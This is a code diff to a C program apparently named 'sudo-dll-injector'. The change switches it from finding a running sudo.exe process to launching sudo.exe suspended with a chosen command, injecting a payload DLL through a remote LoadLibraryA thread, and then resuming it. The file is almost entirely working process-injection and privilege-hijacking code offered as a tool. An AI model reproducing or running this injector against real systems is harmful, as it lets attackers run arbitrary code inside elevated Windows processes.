@@ -1,31 +1,32 @@
 #include <Windows.h>
 #include <psapi.h>
 #include <stdio.h>
+#include <tlhelp32.h>
 
 static HANDLE inject_dll(HANDLE processHandle, char dllName[]);
+static HANDLE spawn_target(char*, char*);
 static HANDLE find_sudo_target();
-
+DWORD FindRunningSudo();
 char defaultPayload[] = "C:\\sudo-dll-payload.dll";
+const char* kSudoFile = "sudo.exe";
 
+
+/*
+Usage: sudo-dll-injector.exe 'cmd to run' <dll to inject>
+*/
 int main(int argc, char **argv) {
 	char* payload;
-	if (argc >= 2) {
-		payload = argv[1];
+	if (argc >= 3) {
+		payload = argv[2];
 	}
 	else {
 		payload = defaultPayload;
 	}
 
-	printf("Going to inject %s\n", payload);
-	printf("Finding target process...\n");
+	printf("Going to inject %s into a controlled process to run '%s'\n", payload, argv[1]);
 
-	HANDLE target_handle = NULL;
-	while (target_handle == NULL) {
-		target_handle = find_sudo_target();
-		// Sleep(200);
-	}
-	printf("Injecting DLL, process handle %p\n", target_handle);
-	inject_dll(target_handle, payload);
+	HANDLE controlled_process = spawn_target(argv[1], payload);
+	WaitForSingleObject(controlled_process, INFINITE);
 }
 
 static HANDLE inject_dll(HANDLE proccessHandle, char dllName[]) {
@@ -59,53 +60,30 @@ static HANDLE inject_dll(HANDLE proccessHandle, char dllName[]) {
 
 	printf("Successfully injected DLL and called LoadLibraryA on it.\n");
 	WaitForSingleObject(rt, INFINITE);
-	CloseHandle(rt);
-	CloseHandle(proccessHandle);
 
 	return rt;
 }
 
 
-static HANDLE find_sudo_target()
-{ 
-	DWORD aProcesses[1024], cbNeeded, cProcesses;
-	unsigned int i;
+static HANDLE spawn_target(char *cmd_to_run, char *path_to_payload) {
+	STARTUPINFO si = { 0 };
+	PROCESS_INFORMATION pi = { 0 };
 
-	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
-	{
-		return NULL;
+	si.cb = sizeof(si);
+	HRESULT createProcessResult = CreateProcessA("sudo.exe", cmd_to_run, 0, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+	if (createProcessResult == 0) {
+		printf("Creating the target failed.\n");
+		return FALSE;
 	}
 
-
-	// Calculate how many process identifiers were returned.
-
-	cProcesses = cbNeeded / sizeof(DWORD);
-
-	// Print the name and process identifier for each process.
-
-	for (i = 0; i < cProcesses; i++)
-	{
-		if (aProcesses[i] != 0)
-		{
-			HANDLE proccesHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, aProcesses[i]);
-			if (NULL != proccesHandle)
-			{
-				HMODULE hMod;
-				DWORD cbNeeded;
-
-				if (EnumProcessModules(proccesHandle, &hMod, sizeof(hMod),
-					&cbNeeded))
-				{
-					char szProcessName[MAX_PATH] = "<unknown>";
-					GetModuleBaseName(proccesHandle, hMod, szProcessName,
-						MAX_PATH);
-					if (strcmp(szProcessName, "sudo.exe") == 0) {
-						printf("Found sudo proccess %i\n", aProcesses[i]);
-						return proccesHandle;
-					}
-				}
-			}
-		}
+	HANDLE remoteThread = inject_dll(pi.hProcess, path_to_payload);
+	if (remoteThread == NULL) {
+		printf("Injecting payload failed.\n");
+		return FALSE;
 	}
-	return NULL;
+
+	// Modify suspended process
+
+	ResumeThread(pi.hThread);
+	return pi.hProcess;
 }
